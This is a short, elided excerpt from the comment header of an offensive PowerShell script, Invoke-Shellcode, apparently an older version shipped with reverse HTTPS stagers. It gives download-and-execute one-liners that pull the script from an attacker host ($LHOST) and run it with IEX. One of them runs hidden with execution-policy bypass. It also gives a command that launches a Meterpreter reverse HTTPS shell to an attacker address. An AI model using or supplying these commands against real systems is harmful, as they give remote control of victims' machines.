...
<#
.SYNOPSIS
Note: This is an older version of Invoke-Shellcode that came with default Reverse HTTPS stangers.
Invoke this in Powershell using:
IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-Shellcode.ps1');
or from the command prompt as 
powershell.exe -NoP -NonI -w Hidden -Exec Bypass -c "IEX ((New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-Shellcode.ps1'))"
...
#Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost IP.AD.DR.ES -lport 443 -Force
